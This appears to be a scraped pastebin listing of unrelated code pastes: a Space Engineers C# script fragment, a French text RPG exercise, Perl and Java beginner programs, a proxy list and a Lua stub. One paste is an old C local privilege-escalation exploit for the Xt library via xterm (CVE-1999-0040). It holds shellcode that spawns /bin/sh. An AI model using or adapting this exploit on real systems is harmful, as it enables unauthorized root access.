            private bool FilterSurfaceBlocksByTag(IMyTextSurfaceProvider x, string tagName, bool caseSensitive = true)
            {
                IMyTerminalBlock asTb = (x as IMyTerminalBlock);
                string cn = asTb.CustomName;

                if (!caseSensitive)
                {
                    cn = cn.ToLower();
                }

                return asTb.CubeGrid == _program.Me.CubeGrid && x.SurfaceCount >= 1 && System.Text.RegularExpressions.Regex.IsMatch(cn, $@""\[{tagName}(?::[ ]*)?(\|?[ ]*\w*[ ]*\|?)*\]"");
            }

            public List<IMyTextSurface> GetTextSurfacesWithTag(string tagName, string groupName = """", bool caseSensitive = true)
            {
                if (!caseSensitive)
                {
                    tagName = tagName.ToLower();
                }

                List<IMyTextSurface> surfaces = new List<IMyTextSurface>();
                List<IMyTextSurfaceProvider> surfaceProviders = new List<IMyTextSurfaceProvider>();

                if (string.IsNullOrWhiteSpace(groupName))
                {
                    _program.GridTerminalSystem.GetBlocksOfType(surfaceProviders, x =>
                        {
                            return FilterSurfaceBlocksByTag(x, tagName, caseSensitive);
                        });
                }
                else
                {
                    _program.GridTerminalSystem.GetBlockGroupWithName(groupName).GetBlocksOfType(surfaceProviders, x =>
                    {
                        return FilterSurfaceBlocksByTag(x, tagName, caseSensitive);
                    });
                }

                if (surfaceProviders.Count > 0)
                {
                    foreach (IMyTextSurfaceProvider surfaceP in surfaceProviders) // SURFACE PROVIDER
                    {
                        System.Text.RegularExpressions.Match match = System.Text.RegularExpressions.Regex.Match((surfaceP as IMyTerminalBlock).CustomName, $@""\[{tagName}(?::[ ]*)?(\|?[ ]*\w*[ ]*\|?)*\]"");
                        List<int> surfaceIds = new List<int>();
                        if (match.Success)
                        {
                            List<string> args = GetArgs(match.Value);
                            if (args.Count < 1)
                            {
                                surfaceIds.Add(1);
                            }
                            else
                            {
                                foreach (var arg in args)
                                {
                                    int succ = 1;
                                    if (Int32.TryParse(arg, out succ))
                                    {
                                        surfaceIds.Add(succ);
                                    }

                                }
                            }

                            foreach (int sid in surfaceIds)
                            {
                                if (sid > 0 && sid <= surfaceP.SurfaceCount)
                                {
                                    IMyTextSurface mts = surfaceP.GetSurface(sid - 1);
                                    if (mts != null)
                                    {
                                        surfaces.Add(mts);
                                    }
                                }
                            }

                            if (InitSurface != null)
                            {
                                foreach (IMyTextSurface ts in surfaces)
                                {
                                    InitSurface(ts);
                                }
                            }
                        }
                    }
                }
                return surfaces;
            }
        }
    }
}"
kT2L8EaE,Xt Library - Local Privilege Escalation - CVE-1999-0040,FlyFar,C,Sunday 25th of February 2024 09:47:21 PM CDT,"#include 
#include 
#include 

#define DEFAULT_OFFSET          0
#define BUFFER_SIZE             1491

long get_esp(void)
{
   __asm__(""movl %esp,%eax\n"");
}

main(int argc, char **argv)
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;

   char execshell[] = ""\xeb\x23"" ""\x5e"" ""\x8d\x1e"" ""\x89\x5e\x0b"" ""\x31\xd2""
   ""\x89\x56\x07"" ""\x89\x56\x0f"" ""\x89\x56\x14"" ""\x88\x56\x19"" ""\x31\xc0""
   ""\xb0\x3b"" ""\x8d\x4e\x0b"" ""\x89\xca"" ""\x52"" ""\x51"" ""\x53"" ""\x50""
""\xeb\x18""
   ""\xe8\xd8\xff\xff\xff"" ""/bin/sh"" ""\x01\x01\x01\x01"" ""\x02\x02\x02\x02""
   ""\x03\x03\x03\x03"" ""\x9a\x04\x04\x04\x04\x07\x04"";

   int i, ofs=DEFAULT_OFFSET, bs=BUFFER_SIZE;

   if(argc>1)
        ofs=atoi(argv[1]);
   if(argc>2)
        bs=atoi(argv[2]);
   printf(""Using offset of esp + %d (%x)\nBuffer size %d\n"",
        ofs, get_esp()+ofs, bs);

   buff = malloc(4096);
   if(!buff)
   {
      printf(""can't allocate memory\n"");
      exit(0);
   }
   ptr = buff;
   memset(ptr, 0x90, bs-strlen(execshell));
   ptr += bs-strlen(execshell);
   for(i=0;i < strlen(execshell);i++)
      *(ptr++) = execshell[i];
   addr_ptr = (long *)ptr;
   for(i=0;i < (8/4);i++)
      *(addr_ptr++) = get_esp() + ofs;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl(""/usr/X11R6/bin/xterm"", ""xterm"", ""-fg"", buff, NULL);
}


// milw0rm.com [1996-08-24]
            "
tEbj1yZb,Untitled,AdminArchon,Python,Sunday 25th of February 2024 09:39:55 PM CDT,"# - Définir une classe de base ""Personnage"" avec des attributs communs tels que le nom,
# le niveau, les points de vie, la force, la dextérité, et l'intelligence.
# Inclure également un attribut pour le nombre de faces du dé utilisé par le personnage.
# (Bonus: créer une classe pour les dés et créer différents dés (Attaque, Survie, Action)
# que les personnage pourraient utiliser.)

# OK Le lien d'hérédité entre De et Personnage est très étrange.. Il vaudrait mieux donner un objet dé en attribut de ton
# personnage, cela serait plus cohérent ! Il aurait son propre dé !
# Celui-ci devrait par ailleurs se limiter à ses propres fonctions: Je ne pense pas que ce soit à lui de stocker
# les différents choix possibles; mais il pourrait cependant indiquer comment on le lance avec une petite méthode !
# ça eviterait de répéter des randint partout dans le code ! (Comme ça pour lancer le dé d'un perso ça ferait perso.de.lancer()


from random import randint, choice


class De:
    liste_choix_de = []

    def __init__(self, valeur_du_de, couleur, matiere):
        self.de_choix_possible = [""Action"", ""Attaque"", ""Survie""]
        self.nom = str(valeur_du_de)
        self.nb_de_faces_de = valeur_du_de
        self.couleur = """"
        self.matiere = """"
        if not valeur_du_de in self.liste_choix_de:
            self.liste_choix_de.append(valeur_du_de)

    def lancer(self):
        return randint(0, self.nb_de_faces_de)

    def choisir_un_de(self, perso, liste_objet_de):
        perso.de = choice(liste_objet_de)


class Personnage:
    def __init__(self, nom):
        self.nom = nom
        self.concurent = """"
        self.niveau = 0
        self.points_de_vie = 500
        self.force = 20
        self.dexterite = 20
        self.intelligence = 20
        self.de = De(20, ""noir"", ""bois"")
        self.objet = [""pikachu"", ""tortank"", ""rafflesia"", ""lugia"", ""chetiflor""]
        self.epee = 0
        self.xp = 0
        self.po = 0
        self.inventaire = []
        self.protectionArmure = 0

    def upgrade(self):
        if self.niveau == 0:
            print(""Tu es niveau 0, deso..."")
        if self.niveau == 1:
            if self.xp > 200:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 2:
            if self.xp > 400:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 3:
            if self.xp > 800:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 4:
            if self.xp > 1600:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 5:
            if self.xp > 3200:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 6:
            if self.xp > 6400:
                self.niveau += 1
                self.force += 5
                self.xp = 0
        elif self.niveau == 7:
            if self.xp > 12800:
                self.niveau += 1
                self.force += 25
                self.xp = 0
                print(""Arrette ! Ta fini le jeu.... ;-)"")
        print(f""{self.force} de force ! "")

    def attaquer(self):
        print()
        print(""ATTAQUE de"", self.nom)
        degats = self.de.lancer() + self.force + self.epee
        if degats > 0:
            print(f""Et Bim ! {self.nom} frappe de {degats} pts ! "")
        else:
            print(f""Attaque loupé de {self.nom}"")
        if degats <= self.concurent.protectionArmure:
            degats = 0
        return degats

    def soigner(self):
        print(""SOIN de"", self.nom)
        points_de_vie_avant = self.points_de_vie
        bonus = self.de.lancer()
        self.points_de_vie += bonus
        if self.points_de_vie > points_de_vie_avant:
            print(f""{bonus} recupéré !"")
        else:
            print(""Les soins n'ont servis à rien !"")

    def echanger(self):
        print(""ECHANGE"", self.nom)
        objet_a = choisir_un_objet(self)
        objet_b = choisir_un_objet(self.concurent)
        print(f""{self.nom} propose {objet_a} à {self.concurent.nom}"")
        choixa = choice([""accepte"", ""refuse""])
        print(f""{self.concurent.nom} {choixa}"")
        if choixa == ""accepte"":
            print(f""et propose {objet_b} a {self.nom}"")
            choixb = choice([""accepte"", ""refuse""])
            print(f""{self.nom} reflechit et {choixb}"")
            if choixb == ""accepte"":
                print(f""Transaction effectué, merci !"")
                return True
            else:
                print(f""Transaction annulée, {self.nom} n'en veux pas !"")
                return False
        else:
            print(f""Transaction annulée, {self.concurent.nom} n'en veux pas !"")
            return False


class Humain(Personnage):
    def __init__(self, nom):
        self.race = ""Humain""
        super().__init__(nom)
        self.force += 20
        self.epee += 6
        self.po += 50

    def se_plaindre(self):
        print(""Oh bordel ! Le pouvoir d'achat....."")


class Nain(Personnage):
    def __init__(self, nom):
        self.race = ""Nain""
        super().__init__(nom)
        self.force += 15
        self.epee += 4
        self.po += 75

    def grogner(self):
        print(""Gnnnnnrrrrrrr biere"")


class Boutique:
    def __init__(self, nomBoutique=""""):
        self.nom = nomBoutique
        self.couleur = """"
        self.armes = []
        self.armures = []
        self.babioles = []
        self.divers = []


class ObjetBoutique(Boutique):
    def __init__(self, objetBoutique, nomObjet="""", prix=0, degats=0, category=""""):
        self.prix = 0
        self.nomObjet = """"
        self.degats = 0
        self.protection = degats
        super().__init__(nomBoutique="""")

        if category == ""armes"":
            objetBoutique.armes.append(nomObjet)
        elif category == ""armures"":
            objetBoutique.armures.append(nomObjet)
        elif category == ""babioles"":
            objetBoutique.babioles.append(nomObjet)
        else:
            objetBoutique.divers.append(nomObjet)

class Liste_des_Objets:
    def __init__(self):
        self.listeArmes = []
        self.listeArmures = []
        self.listeBabioles = []
        self.listeDivers = []


############################################## FONCTIONS ###################################
def afficheListeMarchand(objetClassBoutique, quel_liste):
    i = 1
    nb_element_in_liste = []
    if quel_liste == ""armes"":
        listeaparcourir = objetClassBoutique.armes
    elif quel_liste == ""armures"":
        listeaparcourir = objetClassBoutique.armures
    elif quel_liste == ""babioles"":
        listeaparcourir = objetClassBoutique.babioles
    elif quel_liste == ""divers"":
        listeaparcourir = objetClassBoutique.divers

    for elements in listeaparcourir:
        print(f""{i}:{elements}"")
        nb = str(i)
        nb_element_in_liste.append(nb)
        i += 1
    print(f""{i}:Partir"")
    nb = str(i)
    nb_element_in_liste.append(nb)
    return nb_element_in_liste


def parcourirListe(objetClassBoutique, quel_liste):
    i = 0
    nb_delement = []
    if quel_liste == ""armes"":
        listeAParcourir = objetClassBoutique.armes
    elif quel_liste == ""armures"":
        listeAParcourir = objetClassBoutique.armures
    elif quel_liste == ""babioles"":
        listeAParcourir = objetClassBoutique.babioles
    elif quel_liste == ""divers"":
        listeAParcourir = objetClassBoutique.divers

    for element in listeAParcourir:
        i += 1
        return i


# FAIL......
# def ajouter_un_objetBoutique(objetClassBoutique="""", nomObjet="""", prix=100000, degats_ou_protection=0, categorie=""""):
#     objet = ObjetBoutique(objetClassBoutique, nomObjet, prix, degats_ou_protection, categorie)
#     #Creer l'objet puis....
#
#
#     if categorie == ""armes"":
#         objetClassBoutique.listeArmes.append(objet)    # Sert a mettre chaque objet crée dans une liste d'obj
#     elif categorie == ""armures"":                        # pour les prix du marchand
#         objetClassBoutique.listeArmures.append(objet)
#     elif categorie == ""babioles"":
#         objetClassBoutique.listeBabioles.append(objet)
#     else:
#         objetClassBoutique.listeDivers.append(objet)


def ajouter_un_objetBoutique(objetClassBoutique="""",MainListeObjetMarchand="""" , nomObjet="""", prix=100000, degats_ou_protection=0, categorie=""""):
    objet = ObjetBoutique(objetClassBoutique, nomObjet, prix, degats_ou_protection, categorie)
    # Creer l'objet puis ....

    if categorie == ""armes"":
        MainListeObjetMarchand.listeArmes.append(objet)  # Sert a mettre chaque objet crée dans une liste d'obj
    elif categorie == ""armures"":                            # pour les prix du marchand
        MainListeObjetMarchand.listeArmures.append(objet)
    elif categorie == ""babioles"":
        MainListeObjetMarchand.listeBabioles.append(objet)
    else:
        MainListeObjetMarchand.listeDivers.append(objet)





def recupereobjet(objetClassBoutique, quel_liste, choix):  # Pour le marchand
    if quel_liste == ""armes"":
        listedelobjet = MainListeObjetMarchand.listeArmes
    elif quel_liste == ""armures"":
        listedelobjet = MainListeObjetMarchand.listeArmures
    elif quel_liste == ""babioles"":
        listedelobjet = MainListeObjetMarchand.listeBabioles
    elif quel_liste == ""divers"":
        listedelobjet = MainListeObjetMarchand.listeDivers

    return listedelobjet[choix]


def acheter(objetClassBoutique, perso, mode_boutique):
    if mode_boutique == False:
        perso3 = Humain(choisir_un_nom_perso())
        print(f""Bienvenue, je m'appelle {perso3.nom}, voici {objetClassBoutique.nom}, mon echoppe"")
        print(""Puis-je vous proposer un article ?"")
        mode_boutique = True
    if mode_boutique == True:
        choixperso = """"
        while not choixperso in [""1"", ""2"", ""3"", ""4""]:
            nb_delement = []
            choixperso = input(
                f""\n1. Une arme peut-etre ?\n2. Une armure ?\n3. Un cadeau à offrir ?\n4. Ou Rien du tout Monseigneur ?\n"")
            if choixperso == ""1"":
                print(""Une Arme ? Bien... Laquelle ?\n"")
                nb_delement = afficheListeMarchand(objetClassBoutique, ""armes"")
                choixBoutique = input()
                while not choixBoutique in nb_delement:
                    choixBoutique = input(""Alors ?\n"")
                if choixBoutique == nb_delement[-1]:
                    choixperso = ""4""
                choixBoutique = int(choixBoutique)
                choixBoutique -= 1
                print(MainListeObjetMarchand.listeArmes[choixBoutique].nom)
                print(MainListeObjetMarchand.listeArmes[choixBoutique].nomObjet)
                print(MainListeObjetMarchand.listeArmes[choixBoutique].prix)
                print(MainListeObjetMarchand.listeArmes[choixBoutique].degats)
                if choixBoutique != nb_delement[-1]:
                    objetachat = recupereobjet(objetClassBoutique, ""armes"", choixBoutique)
                    # print(objetachat.nom)
                    print(f""Il vous en coutera {objetachat.prix} pieces d'or"")
                    payer(perso1, objetachat, objetClassBoutique)
                    break
            elif choixperso == ""2"":
                print(""Armure ? Excellent choix, pratique quand on manque de courage !\n"")
                nb_delement = afficheListeMarchand(objetClassBoutique, ""armures"")
                choixBoutique = input()
                while not choixBoutique in nb_delement:
                    choixBoutique = input(""Alors ?\n"")
                if choixBoutique == nb_delement[-1]:
                    choixperso = ""4""
                choixBoutique = int(choixBoutique)
                choixBoutique -= 1
                if choixBoutique != nb_delement[-1]:
                    objetachat = recupereobjet(objetClassBoutique, ""armures"", choixBoutique)
                    print(f""Il vous en coutera {objetachat.prix} pieces d'or"")
                    payer(perso1, objetachat, objetClassBoutique)
                    break
            elif choixperso == ""3"":
                print(""Justement, j'ai de magnifiques objets pour votre dam...monsieur...(begaie..).\n"")
                nb_delement = afficheListeMarchand(objetClassBoutique, ""babioles"")
                choixBoutique = input()
                while not choixBoutique in nb_delement:
                    choixBoutique = input(""Alors ?\n"")
                if choixBoutique == nb_delement[-1]:
                    choixperso = ""4""
                choixBoutique = int(choixBoutique)
                choixBoutique -= 1
                if choixBoutique != nb_delement[-1]:
                    objetachat = recupereobjet(objetClassBoutique, ""babioles"", choixBoutique)
                    print(f""Il vous en coutera {objetachat.prix} pieces d'or"")
                    payer(perso1, objetachat, objetClassBoutique)
                    break
                else:
                    choixperso = ""4""
            elif choixperso == ""4"":
                print(""Vous partez ? Très bien, bonne route à vous.... \n"")
                print(""Mais puis-je insister et vous montrer d'autres produits interressants..."")
                nb_delement = afficheListeMarchand(objetClassBoutique, ""divers"")
                choixBoutique = input()
                while not choixBoutique in nb_delement:
                    choixBoutique = input(""Alors ?"")
                if choixBoutique == nb_delement[-1]:
                    choixperso = ""4""
                choixBoutique = int(choixBoutique)
                choixBoutique -= 1
                if choixBoutique != nb_delement[-1]:
                    objetachat = recupereobjet(objetClassBoutique, ""divers"", choixBoutique)
                    print(f""Il ne vous en couterai que {objetachat.prix} pieces d'or, allez dites oui..."")
                    payer(perso1, objetachat, objetClassBoutique)
                    break
                else:
                    print(""\nTampis... Au revoir\n"")
                    break
            else:
                continue
    #print(perso.inventaire[0].nom)


def payer(perso, objetachat, objetClassBoutique):
    choixargent = """"
    while not choixargent in [""1"", ""2""]:
        choixargent = input(""1. Donner la somme\n2. Partir"")
        if choixargent == ""1"":
            if perso.po >= objetachat.prix:
                print(f""{objetachat.nom} est à vous Monseigneur.."")
                perso.inventaire.append(objetachat)
            else:
                print(""Bien trop cher pour vous Monseigneur\n"")
                print(""Peut-etre autre chose serait plus abordable pour vous... :\n"")
                acheter(objetClassBoutique, perso1, True)
        elif choixargent == ""2"":
            break


def choisir_un_objet(perso):
    return choice(perso.objet)


def choisir_un_nom_perso():
    return choice(
        [""Raclette Froide"", ""Amakiir "", ""Amastacia "", ""Galanodel "", ""Holimion "", ""Ilphelkiir "", ""Liadon "", ""Melianne "",
         ""Nailo "",
         ""Siannodel "", ""Xiloscient"", ""Basha"", ""Dumein"",
         ""Jassan"", ""Khalid"", ""Mostana"", ""Pashar"", ""Rein"", ""Amblecrown"", ""Buckman"", ""Dundragon"", ""Evenwood"",
         ""Greycastle"", ""Tallstag"", ""Bersk"", ""Chernin"", ""Dotsk"", ""Kulenov"",
         ""Marsk""])


def creer_un_de(valeur=20, couleur=""noir"", matiere=""bois""):
    de_enregistre = []
    objet_de = De(valeur, couleur, matiere)
    for element in liste_objet_de:  # evite la copie des dés identiques
        de_enregistre.append(element.nb_de_faces_de)  #
    if not valeur in de_enregistre:  #
        liste_objet_de.append(objet_de)  #


def test_mort(perso, tour):
    if perso.points_de_vie <= 0:
        print(f""{perso.nom} est mort en {tour} manches"")
        return True
    elif perso.concurent.points_de_vie <= 0:
        print(f""{perso.concurent.nom} est mort en {tour} manches"")
        return True
    else:
        return False


def mode_combat(perso):
    chance = choice([""Lui"", ""Vous""])
    print()
    if chance == ""Lui"":
        perso.points_de_vie -= perso.concurent.attaquer()
        print(f""Je m'appelle {perso.concurent.nom} et tu vas mourir aujourd'hui !! "")
    else:
        perso.concurent.points_de_vie -= perso.attaquer()
        if perso.concurent.points_de_vie <= 0:
            print(""Il est mort ! \n"")
            perso.xp += 50
    while perso.concurent.points_de_vie > 0:
        perso.concurent.points_de_vie -= perso.attaquer()
        print()
        print(""Il trebuche ! Allez-y !\n"")
        print()
        if chance != ""Lui"":
            print(f""Je m'appelle {perso.concurent.nom} et tu vas mourir aujourd'hui !! "")
            chance = ""Lui""
        perso.points_de_vie -= perso.concurent.attaquer()
        print()
        if perso.points_de_vie < 100:
            perso.soigner()
            print()
        if perso.concurent.points_de_vie < 5:
            perso.concurent.soigner()
            print()
        if perso.points_de_vie <= 0:
            print(""Vous etes mort....Reposez en paix..."")
            print(
                f""{perso.concurent.nom} en profite pour vous detrousser pendant que vous vivez vos\n derniers instants..."")
            print()
            break
        if perso.concurent.points_de_vie <= 0:
            print(""Il est mort ! \n"")
            perso.xp += 50
            break
        print(f""Points de vie adverse : {perso.concurent.points_de_vie}"")


def race_au_pif():
    return choice([""Humain"", ""Nain""])


# def quoi_faire(perso):
# if perso.points_de_vie <= 20:
#     perso.soigner()
# activite = choice(perso.de.de_choix_possible)
# if activite == ""Action"":
#     perso.echanger()
# elif activite == ""Attaque"":
#     perso.concurent.points_de_vie -= perso.attaquer()
#     if perso.concurent.points_de_vie > 0:
#         print(f""Il reste {perso.concurent.points_de_vie} pts a {perso.concurent.nom} "")
# elif activite == ""Survie"":
#     perso.soigner()
#     print(f""Il reste {perso.points_de_vie} pts a {perso.nom}"")
# else:
#     print(""erreur mec !"")
#     print(activite)


############################################## CREATION DES DES ############################
liste_objet_de = []

creer_un_de()  # d20
creer_un_de(8, ""rouge"", ""metal"")  # d8
creer_un_de(12)  # d12
############################################# BOUTIQUE ET INVENTAIRE ########################

AuCitronDore = Boutique(""Au citron dore"")
MainListeObjetMarchand = Liste_des_Objets()
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand ,""Epee Courte"", 20, 8, ""armes"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Epee Longue"", 40, 12, ""armes"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Dague"", 30, 4, ""armes"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Arc"", 100, 50, ""armes"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand ,""Clibanion"", 500, 40, ""armures"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand ,""Cote de Mailles"", 1000, 100, ""armures"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand ,""chien Bibelot"", 50, 0, ""babioles"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Pokeball"", 50, 0, ""babioles"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Superball"", 80, 0, ""babioles"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Masterball"", 10000, 0, ""babioles"")
ajouter_un_objetBoutique(AuCitronDore,MainListeObjetMarchand , ""Honor Ball"", 0, 0)


############################################# ""CREATION"" DES PERSOS ###########################


# perso1 = Humain(""Robert"")


tour = 1
choix_Menu = 1
choix_user = ""w""
###################################################### TESTS

# print(AuCitronDore.listeArmes)
# for element in AuCitronDore.listeArmes:
#    print(element.nomObjet)
# print(AuCitronDore.babioles)
# print(AuCitronDore.divers)

######################################################### FIN DES TESTS
if choix_Menu == 1:
    print(""Voulez_vous creer :\n1. Humain\n2. Nain\n"")
    while not choix_user in [""1"", ""2""]:
        choix_user = input(""Que voulez_vous creer ? \n"")
    nom_du_perso = input(""Tapez le nom de votre perso\n"")
    print(f""Bonjour et bienvenue {nom_du_perso}\n"")
    # print(choix_user)
    if choix_user == 1:
        perso1 = Humain(nom_du_perso)
        print(""Un Humain ! Excellent Choix\n"")
    else:
        perso1 = Nain(nom_du_perso)
        print(""Un Nain ! Quel idée....\n"")
    perso2 = Humain(choisir_un_nom_perso())
    perso2.points_de_vie -= 475
    perso1.concurent = perso2
    perso2.concurent = perso1

#acheter(AuCitronDore, perso1, False)       # LIGNE A DECOMMENTER POUR LE MODE MARCHAND QUI NE FONCTIONNE PAS CORRECTEMENT

choix_Menu = 2			# et commente celle ci, ça desactive tout le slot et ne garde que la creation perso et le marchand


if choix_Menu == 2:
    ############################################## TEMPS DE JEU #######################################

    mode_camping = True
    while perso1.points_de_vie > 0:
        print(f""\nTour : {tour}\n"")
        perso1.de.choisir_un_de(perso1,
                                liste_objet_de)
        perso2.de.choisir_un_de(perso2,
                                liste_objet_de)
        if mode_camping:
            print(""Vous êtes au campement. Que voulez vous faire ?"")
            choix_camp = input(""1. Dormir\n2. Vous entrainer\n3. Comptez les papillons\n"")
            while choix_camp in [""1"", ""2"", ""3""]:
                if perso1.inventaire != []:
                    for element in perso1.inventaire:
                        if element in AuCitronDore.listeArmes:
                            perso1.epee += element.degats
                        elif element in AuCitronDore.listeArmures:
                            perso1.epee += element.degats
                if choix_camp == ""1"":
                    print(""Vous vous allongez faire un somme..........\n"")
                    perso1.soigner()
                    break
                elif choix_camp == ""2"":
                    bonus = randint(0, 2)
                    if bonus > 0:
                        perso1.upgrade()
                        print(f"" + {bonus} de force grace à l'entrainement ! Bien Joué ! "")
                        perso1.force += bonus
                    else:
                        print(""En l'air ou taper sur ce caillou n'est pas une bonne idée"")
                        if perso1.epee > 2:
                            perso1.epee -= 2
                    break
                else:
                    print(
                        ""0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10, 11, 12, 13, 14, 15, 16, 17, 18, 19..... Vous vous êtes endormis"")
                    mode_camping = False
                    break
        else:
            print(f""Oh mon dieu ! {perso2.nom}, un {perso2.race} vous a aperçu ! Qu'allez vous faire ?"")
            choix_pre_combat = input(""1. S'avancer pour echanger des choses\n2. Sortir votre épee\n\n\n\n"")
            while choix_pre_combat in [""1"", ""2""]:
                if choix_pre_combat == ""1"":
                    choix_ennemi = choice([""Echange"", ""Combat""])
                    if choix_ennemi == ""Echange"":
                        print(""Au moment où vous approchez, il sort de sa poche une bourse\n"")
                        perso1.echanger()
                        print(""Il vous remercie et repart....\n"")
                        x = input()  # delai d'attente pour lecture
                        break
                    else:
                        print(""Au moment où vous approchez, il degaine son epée et se jette sur vous !\n"")
                        mode_combat(perso1)
                    break
                else:
                    print(""Vous sortez votre épée, il parait surpris mais sort la sienne ! \n"")
                    mode_combat(perso1)
                    break
        mode_camping = False
        tour += 1
        if race_au_pif() == ""Humain"":
            perso2 = Humain(choisir_un_nom_perso())
            # perso2.se_plaindre()
        else:
            perso2 = Nain(choisir_un_nom_perso())
            # perso2.grogner()
        perso1.concurent = perso2
        perso2.concurent = perso1
        perso2.points_de_vie -= 475
        print(f""\nUn {perso2.race} vous a surpris et vous attaque ! En garde !\n"")
        x = input()  # delai d'attente pour lecture
        mode_combat(perso1)
        print(""Extenué, vous apercevez un campement loin là-bas\n"")
        if tour % 2:
            mode_camping = True
            y = input(""Veut tu quitter ? \n1. Oui\n2. Non\n"")
            if y in [""1"", ""2""]:
                if y == ""1"":
                    break
                else:
                    continue

# - Créer des classes dérivées pour différentes races de personnages (par exemple, Humain, Elfe, Nain) héritant de la classe de
# base ""Personnage"". Chaque classe dérivée devrait inclure des attributs spécifiques à la race et des méthodes pour les actions
#  propres à la race.
#
# - Implémenter une méthode pour lancer un dé dans la classe de base ""Personnage"", et permettre aux classes dérivées de personnaliser
#  cette méthode en fonction de leur race spécifique (par exemple, une race peut avoir des avantages ou des désavantages spécifiques).
#
# - Mettre en place une interface utilisateur simple en ligne de commande permettant à l'utilisateur de créer un nouveau
# personnage en choisissant sa race, de visualiser ses statistiques, de lancer des dés pour les actions, et de faire évoluer
#  son personnage en gagnant de l'expérience.
#
# - Mettre en place une boucle de jeu contenant deux phases:
# 	- Phase repos: Le joueur peut faire des actions sur son personnage (soigner, upgrade ses stats lorsqu'il gagne un
#  niveau etc...)
# 	- Phase combat: Le joueur affronte avec son personnage un ennemi généré par le programme (aléatoirement ou non).
#  A l'issue du combat, retour en phase de repos.
#
# - Bonus : Intégrer des fonctionnalités supplémentaires telles que la gestion de l'inventaire avec des armes particulières
#  (necessiteront d'autres classes ;) ) ou des compétences spéciales pour chaque race. Cela permettra alors notamment d'ajouter
# des boutiques lors de la phase repos.
"
B5tHPTJK,menghasilkan.deret.fibonacci.pl,paperline27,Perl,Sunday 25th of February 2024 09:24:32 PM CDT,"sub fibonacci {
    my $n = shift;
    return $n if $n <= 1;
    return fibonacci($n - 1) + fibonacci($n - 2);
}

print ""Masukkan panjang deret Fibonacci: "";
my $panjang = <STDIN>;
chomp($panjang);

print ""Deret Fibonacci: "";
for (my $i = 0; $i < $panjang; $i++) {
    print fibonacci($i), "" "";
}
print ""\n"";"
AtzDgmgU,menghasilkan.pola.segitiga.siku-siku.pl,paperline27,Perl,Sunday 25th of February 2024 09:17:26 PM CDT,"print ""Masukkan tinggi segitiga: "";
my $tinggi = <STDIN>;
chomp($tinggi);

for my $i (1..$tinggi) {
    for my $j (1..$i) {
        print ""* "";
    }
    print ""\n"";
}"
cKSUPDKd,mencari.jumlah.dari.bilangan.genap.dalam.rentang.tertentu.pl,paperline27,Perl,Sunday 25th of February 2024 09:10:28 PM CDT,"sub sum_of_even {
    my ($start, $end) = @_;
    my $sum = 0;
    for my $num ($start..$end) {
        $sum += $num if $num % 2 == 0;
    }
    return $sum;
}

print ""Masukkan rentang bilangan (misalnya 1 10): "";
my $input = <STDIN>;
chomp($input);

my ($start, $end) = split(' ', $input);

my $result = sum_of_even($start, $end);
print ""Jumlah bilangan genap dari $start hingga $end adalah $result\n"";"
inEgUdgb,Menghitung.Faktorial.pl,paperline27,Perl,Sunday 25th of February 2024 09:02:41 PM CDT,"sub factorial {
    my $n = shift;
    return 1 if $n == 0;
    return $n * factorial($n - 1);
}

print ""Masukkan bilangan: "";
my $input = <STDIN>;
chomp($input);

my $result = factorial($input);
print ""Faktorial dari $input adalah $result\n"";"
k9Gikh8v,ChronosAdmin,PapiGemezs,PHP,Sunday 25th of February 2024 08:32:02 PM CDT,"{
   ""Admin"": [
      {
         ""version"": 2.4
      }
   ]
}"
zyKP1Bs7,Mad,Unknown_No_1,PHP,Sunday 25th of February 2024 08:14:20 PM CDT,MadIsStar
H1ZbPasa,Review Pastes,xxsa,PHP,Sunday 25th of February 2024 07:56:23 PM CDT,https://pastes.io/
8M2QZ9WE,Employee,SenpaiZero,Java,Sunday 25th of February 2024 07:44:17 PM CDT,"package asd;

public class Employee {
	private String name;
	
	// Setter for employee name
	public void setName(String name)
	{
		this.name = name;
	}
	
	// Getter for employee name
	public String getName()
	{
		return name;
	}
}
"
HhV3MnJg,FullTimeEmployee,SenpaiZero,Java,Sunday 25th of February 2024 07:44:06 PM CDT,"package asd;

public class FullTimeEmployee{
	private double monthlySalary;
	
	// Setter for full time salary employee
	public void setMonthlySalary(double monthlySalary)
	{
		this.monthlySalary = monthlySalary;
	}

	// Getter for full time salary employee
	public double getMonthlySalary()
	{
		return monthlySalary;
	}
}
"
s1iE655c,PartTimeEmployee,SenpaiZero,Java,Sunday 25th of February 2024 07:43:52 PM CDT,"package asd;

public class PartTimeEmployee{
	private double ratePerHour;
	private int hoursWorked;
	private double wage;
	
	// Setter for total wage
	public void setWage(double wage)
	{
		this.wage = wage;
	}
	
	// Getter for total wage
	public double getWage()
	{
		return wage;
	}

	// Getter for hours worked
	public int getHoursWorked() {
		return hoursWorked;
	}

	// Setter for hours worked
	public void setHoursWorked(int hoursWorked) {
		this.hoursWorked = hoursWorked;
	}

	// Getter for rate per hour
	public double getRatePerHour() {
		return ratePerHour;
	}

	// Setter for rate per hour
	public void setRatePerHour(double ratePerHour) {
		this.ratePerHour = ratePerHour;
	}
}
"
W1Xca0KB,SOCKS4/5 HTTP/S Anonymous Proxy 10gbps,Artem_,JSON,Sunday 25th of February 2024 07:26:04 PM CDT,"85.114.96.3:1080
85.114.96.3:808"
zx3P95DT,Untitled,EDDY_here,Lua,Sunday 25th of February 2024 07:03:46 PM CDT,"print('Make new update file give name:')
local user_file_named = read()
local FILENAME = ""/""..user_file_named.."".lua""
